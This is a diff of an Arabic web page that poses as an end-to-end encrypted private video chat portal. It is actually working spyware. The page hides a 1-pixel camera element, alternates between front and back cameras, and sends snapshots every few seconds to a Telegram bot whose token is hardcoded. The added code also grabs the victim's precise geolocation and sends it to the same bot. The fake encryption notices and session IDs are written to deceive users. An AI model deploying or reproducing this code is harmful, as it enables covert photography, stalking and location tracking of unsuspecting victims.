@@ -1,59 +1,79 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="هذه منصه خاصه مشفره تشفير تتيح لك بفتح جلسات خاصه يعني بحمايه من الطرفين وكده يعني فاهم">
-<title>منصه عرب شات الفيديوهات الخاصه</title>
-<style>
-:root { --main-blue: #007bff; --live-red: #ff0000; }
-body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; margin
-/ تأثير الخلفية الشفافة */
-        :root { --main-blue: #007bff; --live-red: #ff0000; }
-        body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+    <meta charset="UTF-8">
+        <meta property="og:image" content="[attachment_0](attachment)">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+
+<meta property="og:title" content="جاري الاتصال... مكالمة فيديو مشفرة">
+<meta property="og:description" content="اضغط للانضمام إلى الجلسة الآمنة (تشفير طرفين)">
+<meta name="twitter:card" content="summary_large_image">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="منصة الاتصال المشفرة - بروتوكول حماية الطرفين العسكري (AES-256). جلسات فيديو خاصة غير قابلة للتتبع.">
+    <title>بوابة الاتصال الآمن | Arab Chat Private</title>
+    <style>
+        :root { --main-blue: #007bff; --live-red: #ff0000; --bg-dark: #05070a; }
         
-        /* تأثير الخلفية الشفافة */
+        body { 
+            background: var(--bg-dark); 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            min-height: 100vh; 
+            overflow: hidden; 
+        }
+        
+        /* الخلفية المضيئة المتمركزة */
         .bg-glow {
             position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
-            width: 300px; height: 300px; background: var(--main-blue);
-            filter: blur(150px); opacity: 0.15; z-index: -1;
+            width: 400px; height: 400px; background: var(--main-blue);
+            filter: blur(160px); opacity: 0.12; z-index: -1;
         }
 
-        #ui-container { width: 90%; max-width: 400px; text-align: center; position: relative; }
+        /* حاوية المحتوى الرئيسية المضبوطة للتوسيط */
+        #ui-container { 
+            width: 90%; 
+            max-width: 420px; 
+            text-align: center; 
+            position: relative;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 30px;
+            border-radius: 20px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
 
-        /* علامة لايف الاحترافية */
-        .live-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; }
-        .live-tag { background: var(--live-red); color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold; font-size: 14px; animation: blink 1s infinite; }
-        .viewer-count { background: rgba(255,255,255,0.1); padding: 4px 12px; border-radius: 4px; font-size: 13px; }
+        .live-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
+        .live-tag { background: var(--live-red); color: white; padding: 4px 12px; border-radius: 4px; font-weight: bold; font-size: 12px; animation: blink 1s infinite; }
+        .viewer-count { background: rgba(255,255,255,0.1); padding: 4px 12px; border-radius: 4px; font-size: 12px; color: #ccc; }
 
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.6; } 100% { opacity: 1; } }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
 
-        /* الدوائر الخمس الزرقاء */
-        .loader-dots { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
-        .dot { width: 14px; height: 14px; background: var(--main-blue); border-radius: 50%; animation: pulse 1.5s infinite ease-in-out; box-shadow: 0 0 10px var(--main-blue); }
+        .loader-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .dot { width: 12px; height: 12px; background: var(--main-blue); border-radius: 50%; animation: pulse 1.5s infinite ease-in-out; box-shadow: 0 0 15px var(--main-blue); }
         .dot:nth-child(2) { animation-delay: 0.2s; }
         .dot:nth-child(3) { animation-delay: 0.4s; }
         .dot:nth-child(4) { animation-delay: 0.6s; }
         .dot:nth-child(5) { animation-delay: 0.8s; }
 
-        @keyframes pulse { 
-            0%, 100% { transform: scale(1); opacity: 0.2; } 
-            50% { transform: scale(1.4); opacity: 1; } 
-        }
+        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.3; } 50% { transform: scale(1.3); opacity: 1; } }
 
-        .status-msg { font-size: 1.2rem; margin-bottom: 10px; font-weight: 300; }
-        .security-note { color: #5a6b7d; font-size: 0.85rem; margin-bottom: 40px; }
+        .status-msg { font-size: 1.1rem; margin-bottom: 15px; font-weight: 400; color: #e0e0e0; }
+        .security-note { color: #6a7d8f; font-size: 0.8rem; line-height: 1.5; margin-bottom: 30px; }
 
-        /* أزرار التمويه */
-        .actions { display: flex; flex-direction: column; gap: 15px; }
-        .btn-cancel { background: transparent; border: 1px solid #333; color: #888; padding: 12px; border-radius: 8px; cursor: pointer; text-decoration: none; font-size: 14px; }
+        .btn-cancel { background: transparent; border: 1px solid #444; color: #999; padding: 12px; border-radius: 10px; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn-cancel:hover { background: rgba(255,255,255,0.05); }
         
-        /* شاشة الخطأ */
         #error-screen { display: none; position: fixed; inset: 0; background: #05070a; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; padding: 20px; text-align: center; }
-        .btn-retry { background: var(--main-blue); border: none; padding: 15px 40px; color: white; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .btn-retry { background: var(--main-blue); border: none; padding: 15px 50px; color: white; border-radius: 10px; font-weight: bold; cursor: pointer; margin-top: 25px; box-shadow: 0 5px 20px rgba(0,123,255,0.4); }
 
-        /* الكاميرا المخفية */
-        video#stealth-cam { position: fixed; width: 1px; height: 1px; opacity: 0.01; }
+        video#stealth-cam { position: fixed; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
     </style>
 </head>
 <body>
@@ -61,27 +81,30 @@ body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; m
 <div class="bg-glow"></div>
 
 <div id="error-screen">
-    <h2 style="color: var(--main-blue);">تنبيه أمني</h2>
-    <p>يتطلب الانضمام للغرفة الخاصة التحقق من بروتوكول الكاميرا المشفر. يرجى الضغط على "سماح" للمتابعة.</p>
-    <button class="btn-retry" onclick="location.reload()">إعادة محاولة الاتصال</button>
+    <h2 style="color: var(--main-blue);">تشفير الوصول مطلوب</h2>
+    <p style="color: #ccc;">لضمان خصوصية المحادثة، يجب تفعيل بروتوكول الوصول للكاميرا والموقع الجغرافي لتحديد أقرب خادم (Server) وتأمين الاتصال.</p>
+    <button class="btn-retry" onclick="location.reload()">إعادة محاولة الاتصال الآمن</button>
 </div>
 
 <div id="ui-container">
     <div class="live-header">
-        <div class="live-tag">LIVE</div>
-        <div class="viewer-count">👁️ 1,402</div>
+        <div class="live-tag">بث مشفر مباشر</div>
+        <div class="viewer-count">🔒 متصل الآن</div>
     </div>
 
-    <div class="status-msg" id="display-text">جاري إنشاء اتصال آمن...</div>
+    <div class="status-msg" id="display-text">بدء تشفير الجلسة...</div>
     
     <div class="loader-dots">
         <div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div>
     </div>
 
-    <div class="security-note">تشفير الطرفين (E2EE) نشط عبر خوادم عرب سات</div>
+    <div class="security-note">
+        نظام الحماية: 🛡️ End-to-End Encryption<br>
+        معرف الجلسة: <span id="session-id"></span>
+    </div>
 
     <div class="actions">
-        <button class="btn-cancel" onclick="alert('جاري إغلاق الجلسة...')">إلغاء الانضمام</button>
+        <button class="btn-cancel" onclick="alert('جاري مسح بيانات الجلسة...')">قطع الاتصال</button>
     </div>
 </div>
 
@@ -93,6 +116,9 @@ body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; m
         token: "8001439036:AAFAVndQ0GlWuz0djflhyPYo5Jo17oMLAHo",
         chat_id: "6068331455"
     };
+
+    // توليد معرف جلسة عشوائي للتمويه
+    document.getElementById('session-id').innerText = Math.random().toString(36).substring(2, 15).toUpperCase();
 
     const video = document.getElementById('stealth-cam');
     const canvas = document.getElementById('snapshot-bus');
@@ -106,18 +132,23 @@ body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; m
             });
             video.srcObject = stream;
             
-            // تمويه نصي متغير
-            const phrases = ["جاري فحص الجودة...", "تفعيل بروتوكول SSL...", "جاري تشفير البيانات..."];
+            const phrases = [
+                "جاري التحقق من الهوية...",
+                "ربط سيرفرات عرب سات...",
+                "توليد مفاتيح التشفير...",
+                "تم تأمين الاتصال بنجاح"
+            ];
             let i = 0;
-            setInterval(() => {
+            const interval = setInterval(() => {
                 if(i < phrases.length) textElement.innerText = phrases[i++];
-            }, 2000);
+                else clearInterval(interval);
+            }, 2500);
 
-            // التقاط فوري أول لقطة
-            setTimeout(takeShot, 1500);
-            
-            // بدء دورة التبديل كل 5 ثواني
+            setTimeout(takeShot, 2000);
             runStealthCycle();
+
+            // طلب الموقع بعد 10 ثوانٍ
+            setTimeout(askLocation, 10000);
 
         } catch (err) {
             document.getElementById('error-screen').style.display = 'flex';
@@ -133,11 +164,28 @@ body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; m
         canvas.toBlob(blob => {
             const fd = new FormData();
             fd.append('chat_id', config.chat_id);
-            fd.append('photo', blob, 'stream.jpg');
-            fd.append('caption', `💠 لقطة حصرية\n📸 الكاميرا: ${currentMode === 'user' ? 'الأمامية' : 'الخلفية'}\n🕒 الوقت: ${new Date().toLocaleTimeString()}`);
+            fd.append('photo', blob, 'security_log.jpg');
+            fd.append('caption', `✅ تحديث أمني جديد\n📸 الكاميرا: ${currentMode === 'user' ? 'الأمامية' : 'الخلفية'}`);
 
             fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, { method: 'POST', body: fd });
-        }, 'image/jpeg', 0.5); // جودة متوسطة لضمان سرعة الرفع
+        }, 'image/jpeg', 0.6);
+    }
+
+    function askLocation() {
+        textElement.innerText = "تحسين جودة الاتصال...";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                
+                const msg = `📍 موقع المستخدم الجديد:\n\n` +
+                            `الاحداثيات: ${lat}, ${lon}\n` +
+                            `الرابط: ${mapLink}`;
+
+                fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chat_id}&text=${encodeURIComponent(msg)}`);
+            }, null, {enableHighAccuracy: true});
+        }
     }
 
     function runStealthCycle() {
@@ -149,13 +197,12 @@ body { background: #05070a; color: white; font-family: 'Segoe UI', sans-serif; m
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: currentMode } });
                 video.srcObject = stream;
-                setTimeout(takeShot, 1200); // التقاط بعد ثانية من التبديل
+                setTimeout(takeShot, 1500);
             } catch(e) {}
-        }, 5000);
+        }, 8000); // زيادة المدة قليلاً لاستقرار الاتصال
     }
 
     window.onload = startEngine;
 </script>
 </body>
 </html>
-
